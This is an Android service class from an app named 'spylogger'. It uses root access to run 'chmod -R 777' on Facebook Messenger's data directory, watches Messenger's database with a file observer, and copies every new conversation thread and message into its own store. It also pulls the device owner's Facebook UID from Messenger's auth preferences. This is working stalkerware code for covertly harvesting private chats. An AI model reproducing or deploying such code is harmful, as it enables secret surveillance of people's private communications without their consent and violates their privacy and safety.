package com.gravatasufoca.spylogger.services;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager.NameNotFoundException;
import android.os.Binder;
import android.os.FileObserver;
import android.os.IBinder;
import android.util.Log;

import com.gravatasufoca.spylogger.dao.DatabaseHelper;
import com.gravatasufoca.spylogger.dao.messenger.DatabaseHelperFacebookPrefs;
import com.gravatasufoca.spylogger.dao.messenger.DatabaseHelperFacebookThreads;
import com.gravatasufoca.spylogger.model.Mensagem;
import com.gravatasufoca.spylogger.model.TipoMensagem;
import com.gravatasufoca.spylogger.model.TipoMidia;
import com.gravatasufoca.spylogger.model.Topico;
import com.gravatasufoca.spylogger.model.messenger.Contact;
import com.gravatasufoca.spylogger.model.messenger.Messages;
import com.gravatasufoca.spylogger.model.messenger.Prefs;
import com.gravatasufoca.spylogger.model.messenger.Sender;
import com.gravatasufoca.spylogger.model.messenger.Thread;
import com.gravatasufoca.spylogger.utils.Utils;
import com.j256.ormlite.dao.Dao;
import com.j256.ormlite.dao.GenericRawResults;
import com.stericson.RootTools.RootTools;
import com.stericson.RootTools.execution.CommandCapture;

import org.json.JSONException;
import org.json.JSONObject;

import java.sql.SQLException;
import java.util.ArrayList;
import java.util.List;

public class MessengerService extends Service {

	private String pathToWatch;
	private String inFileName;
	private Dao<Messages, Integer> daoMsgExternal;
	private Dao<Thread, Integer> daoThreadExternal;

	private DatabaseHelper dbHelper;

	private DatabaseHelperFacebookThreads external;
    private final IBinder mBinder = new LocalBinder();

    public class LocalBinder extends Binder {
    	MessengerService getService() {
            return MessengerService.this;
        }
    }

	public MessengerService() {
	}

	@Override
	public IBinder onBind(Intent intent) {
		return mBinder;
	}

	private void chmod() {

		try{
			CommandCapture command = new CommandCapture(0, "chmod -R 777 "
				+ Utils.FACEBOOK_DIR_PATH, "chmod -R 777 "
						+ getApplicationContext().getPackageManager()
						.getPackageInfo(getPackageName(), 0).applicationInfo.dataDir);

			if(RootTools.isAccessGiven())
				RootTools.getShell(true).add(command);

		}catch(Exception e){
			e.printStackTrace();
		}

	}

	@Override
	public void onCreate() {
		pathToWatch = DatabaseHelperFacebookThreads.DATABASE_NAME;
		try {
			inFileName = getApplicationContext().getPackageManager()
                    .getPackageInfo(getPackageName(), 0).applicationInfo.dataDir
                    + "/databases/"+DatabaseHelper.DATABASE_NAME;
		} catch (NameNotFoundException e) {
			e.printStackTrace();
		}

		chmod();
	}



	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {

		Log.d("FACESLOG - FLAGS", Integer.toString(flags));
		Utils.context=getApplicationContext();
		updateMsg();

		if(Utils.faceObserver==null)
			setObserver();

		Log.d("FACESLOG - OBSESRVER", Utils.faceObserver.toString());
		return START_REDELIVER_INTENT;
	}

	private void setObserver(){
		Utils.faceObserver = new FileObserver(pathToWatch) { // set up a file observer to
			// watch this directory on
			// sd card

			@Override
			public void onEvent(int event, String file) {

				switch (event) {
				case FileObserver.MODIFY:
					Log.d("FACES LOGGER", "MODIFY:" + pathToWatch + file);
					updateMsg();
					break;
				default:
					// just ignore
					break;
				}

			}
		};
		Utils.faceObserver.startWatching(); // START OBSERVING
	}



	private void updateMsg() {

		external = new DatabaseHelperFacebookThreads(getApplicationContext());
		dbHelper = new DatabaseHelper((getApplicationContext()));

		try {
			daoMsgExternal = external.getMessagesDao();
			daoThreadExternal = external.getThreadDao();

			daoMsgExternal.executeRaw("attach database '"+inFileName+"' as 'localdb' ");


			GenericRawResults<String[]> raws= daoThreadExternal.queryRaw("select  thread_key from threads where thread_key not in( select idReferencia from localdb.topico )");
			List<String> sThread=new ArrayList<>();

			for(String[] resultRaw:raws){
				sThread.add(resultRaw[0]);
			}

			GenericRawResults<String[]> rawResults= daoMsgExternal.queryRaw("select msg_id from messages where msg_id not in( select idReferencia from localdb.mensagem )");
			List<String> sMensagens=new ArrayList<>();
			for(String[] resultRaw:rawResults){
				sMensagens.add(resultRaw[0]);
			}

			List<Thread> threads=daoThreadExternal.query(daoThreadExternal.queryBuilder().where().in("thread_key",sThread).prepare());

			Contact proprietario=getProprietario(getApplicationContext());
			List<Topico> tt=new ArrayList<>();
			for(Thread thread:threads){
				Topico topico=new Topico.TopicoBuilder()
						.setIdReferencia(thread.getId().toString())
						.setNome(thread.getNomes(proprietario))
						.build();
				tt.add(topico);
			}

			dbHelper.getTopicoDao().create(tt);

			List<Messages> messages=daoMsgExternal.query(daoMsgExternal.queryBuilder().where().in("msg_id",sMensagens).prepare());
			List<Topico> topicos=dbHelper.getTopicoDao().query(dbHelper.getTopicoDao().queryBuilder().where().in("idReferencia",sThread).prepare());
			List<Mensagem> mensagens=new ArrayList<>();
			for (Messages message : messages) {

                Sender sender=message.getSender();
                if(sender==null)continue;
                Contact contato=sender.getContato();
                boolean remetente=contato.equals(proprietario);

                Topico tmpTopico = null;
                for (Topico topico : topicos) {
                    if (message.getThread_key().equals(topico.getIdReferencia())) {
                        tmpTopico = topico;
                        break;
                    }
                }
                if (tmpTopico == null) {
                    tmpTopico = dbHelper.getTopicoDao().queryForFirst(dbHelper.getTopicoDao().queryBuilder().where().eq("idReferencia", message.getThread_key()).prepare());
                }

                Mensagem mensagem = new Mensagem.MensagemBuilder()
                        .setIdReferencia(message.getMsg_id())
                        .setRemetente(remetente)
                        .setTexto(message.getText())
                        .setData(message.getTimestamp_ms())
                        .setDataRecebida(message.getTimestamp_ms())
                        .setTamanhoArquivo(0)
                        .setTipoMidia(TipoMidia.TEXTO)
                        .setContato(sender.getNome())
                        .setTopico(tmpTopico)
                        .setTemMedia(false).build(TipoMensagem.MESSENGER);

				mensagens.add(mensagem);
            }

			dbHelper.getMensagemDao().create(mensagens);

		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private Contact getProprietario(Context context){
		try {

			String uid=context.getSharedPreferences(Utils.PREF, 0).getString("UID", "");
			if(!uid.isEmpty())
				return Utils.getContato(uid);

			Dao<Prefs, Integer> dao=(new DatabaseHelperFacebookPrefs(context)).getPrefsDao();
			List<Prefs> prefs=dao.queryForAll();

			for(Prefs pref:prefs){
				if(pref.getKey().trim().equalsIgnoreCase("/auth/user_data/fb_uid")){
					context.getSharedPreferences(Utils.PREF, 0).edit().putString("UID", pref.getValue()).commit();

					return Utils.getContato(pref.getValue());
				}
				else if(pref.getKey().trim().equalsIgnoreCase("/auth/user_data/fb_me_user")){
					try {
						JSONObject json=new JSONObject(pref.getValue());
						context.getSharedPreferences(Utils.PREF, 0).edit().putString("UID", json.getString("uid")).commit();

						return Utils.getContato(json.getString("uid"));
					} catch (JSONException e) {
						e.printStackTrace();
					}
				}

			}

		} catch (SQLException e) {
			e.printStackTrace();
		}
		return new Contact();
	}
}